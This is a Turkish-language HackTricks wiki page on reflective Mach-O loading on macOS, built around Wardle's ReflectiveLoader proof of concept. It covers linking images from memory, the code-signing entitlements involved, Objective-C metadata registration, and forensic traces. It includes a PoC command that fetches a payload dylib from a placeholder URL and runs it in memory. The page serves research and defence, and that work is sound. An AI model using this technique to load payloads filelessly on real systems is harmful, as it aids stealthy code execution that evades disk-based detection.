# macOS'ta Reflective Mach-O Yükleme

{{#include ../../../banners/hacktricks-training.md}}

Reflective loader, bir Mach-O image'ını kendi process'inde zaten bulunan byte'lardan map eder, ardından payload dosyasını açması için system loader'a başvurmadan image'ı link eder ve initializers'larını çalıştırır. Bu, **process içi code execution**'dır; privilege escalation veya remote-process injection primitive'i değildir.<sup>[[2]](#references)</sup>

Güncel macOS sürümlerinde eski `NSCreateObjectFileImageFromMemory`/`NSLinkModule` yolu image'ı diske yazar. ReflectiveLoader bunun yerine eski Apple dyld loading kodunu içerir; Wardle bunu macOS 15 ve 26'da gösterdi.<sup>[[2]](#references)[[3]](#references)</sup>

Loader Hardened Runtime kullanıyorsa unsigned in-memory code'un çalışması için `com.apple.security.cs.allow-unsigned-executable-memory` veya `com.apple.security.cs.disable-executable-page-protection` gibi bir executable-memory exception gerekir; aksi takdirde code-signing enforcement çalıştırmayı engeller. Bu, loader'a ilişkin bir signing kısıtlamasıdır; elevation primitive'i değildir. Bkz. [macOS entitlements reference](../macos-security-protections/macos-dangerous-entitlements.md#comapplesecuritycsallow-unsigned-executable-memory).<sup>[[2]](#references)</sup>

PoC için raw Mach-O **bundle, framework veya dylib** sunan bir URL verin. `main.mm` dosyası boş indirmeleri reddeder ve `LC_DYLD_CHAINED_FIXUPS` kullanan payload'ların desteklenmediğini belirtir. Yerel bir pathname de kabul edilir, ancak bu girdi fileless bir workflow değildir. URL biçimi byte'ları `NSData`'ya okur ve buffer'ını ve uzunluğunu `custom_dlopen_from_memory`'ye iletir.<sup>[[4]](#references)</sup>

```bash
./PoC 'https://example.invalid/payload.dylib'
```

Gömülü yükleyici `ImageLoaderMachO::instantiateFromMemory` işlevini, ardından `image->link` işlevini çağırır. Objective-C metadata'yı **linking işleminden sonra ancak** kurucuları çalıştıran `image->runInitializers` işlevinden **önce** kaydeder.<sup>[[5]](#references)</sup> Kayıt yapılmazsa, Objective-C mesajı gönderen bir kurucu `unrecognized selector sent to instance` hatasıyla başarısız olabilir.<sup>[[3]](#references)</sup> [dyld'nin normal image yükleme akışına](macos-library-injection/macos-dyld-process.md#flow) ve [Mach-O bölümleri başvurusuna](../macos-files-folders-and-binaries/universal-binaries-and-mach-o-format.md#objective-c-common-sections) bakın.

## Activating Objective-C metadata

Normal dyld yüklemesinden farklı olarak, eski image loader'ın gömülmesi payload'ın Objective-C metadata'sını `libobjc` tarafından otomatik olarak kullanılabilir hâle getirmez.<sup>[[3]](#references)</sup> Uyarlanmış LLVM JIT yaklaşımı, eşlenmiş `__DATA` ve `__DATA_CONST` Objective-C bölümlerini tarar, ardından kurucular çalıştırılmadan önce şu adımları uygular:<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>

1. `__objc_selrefs` içinde `sizeof(SEL)` adımlarla ilerleyin. Null olmayan her selector'ın adını `sel_getName` ile alın, `sel_registerName` işlevine aktarın ve bölümdeki işaretçiyi kanonik `SEL` ile değiştirin.
2. `__objc_classlist` içindeki class'ları toplayın ve superclass bağımlılıklarını önce çözümleyerek `objc_readClassPair` ile kaydedin.
3. `__objc_classrefs` ve `__objc_superrefs` içindeki referansları kayıtlı class'lara veya metaclass'lara yönlendirin ve `__objc_catlist` içindeki category method'larını ekleyin.

Örneğin, `ObjCRuntime.cpp` içindeki selector onarımı şu işlemlere denktir:<sup>[[6]](#references)</sup>

```objectivec
for (uint8_t *cursor = sectionStart;
     cursor < sectionStart + selRefsSectionSize;
     cursor += sizeof(SEL)) {
    SEL *selector = (SEL *)cursor;
    if (*selector == NULL) continue;
    *selector = sel_registerName(sel_getName(*selector));
}
```

PoC, Objective-C runtime'ının dahili davranışına dayanır ve her Mach-O biçimi özelliğini desteklemez; bu nedenle kayıt kodu, genel amaçlı ve doğrudan kullanılabilir bir loader'dan ziyade bir uygulama referansıdır.<sup>[[1]](#references)[[4]](#references)[[6]](#references)</sup> Payload tarafından tanımlanan sınıfların yanı sıra başvurulan Apple sınıfları ve metotları için de kayıt gerekir.<sup>[[3]](#references)</sup>

Yansıtmalı olarak yüklenen bir imaj, yazarın testlerinde `dyld_all_image_infos` içinde görünmez. Bunun yerine, anonim çalıştırılabilir eşlemeleri `vmmap` içinde isimsiz `dylib` bölgeleri olarak görünebilir; örneklenen stack frame'leri `<unknown binary>` olarak gösterilebilir. Bunlar, bu loader'a güvenilir biçimde atıf yapmayı sağlamayan inceleme ipuçlarıdır ve başka bir sürecin görev bilgilerine erişim entitlement ile sınırlıdır. Süreç erişimi kısıtlamaları için [macOS memory dumping](../macos-files-folders-and-binaries/macos-memory-dumping.md) bölümüne bakın.<sup>[[3]](#references)</sup>

## References

- [1] [macOS'ta LLVM JIT, Objective-C ve Swift: bilgi dökümü](https://stanislaw.github.io/2018-09-03-llvm-jit-objc-and-swift-knowledge-dump.html)
- [2] [macOS'ta Yansıtmalı Kod Yüklemesini Geri Getirmek (I. Bölüm)](https://objective-see.org/blog/blog_0x7C.html)
- [3] [macOS'ta Yansıtmalı Kod Yüklemesini Geri Getirmek (II. Bölüm)](https://objective-see.org/blog/blog_0x82.html)
- [4] [ReflectiveLoader PoC main.mm](https://github.com/pwardle/ReflectiveLoader/blob/main/PoC/PoC/main.mm)
- [5] [ReflectiveLoader custom_dlfcn.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/custom_dlfcn.cpp)
- [6] [ReflectiveLoader ObjCRuntime.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/ObjCRuntime.cpp)
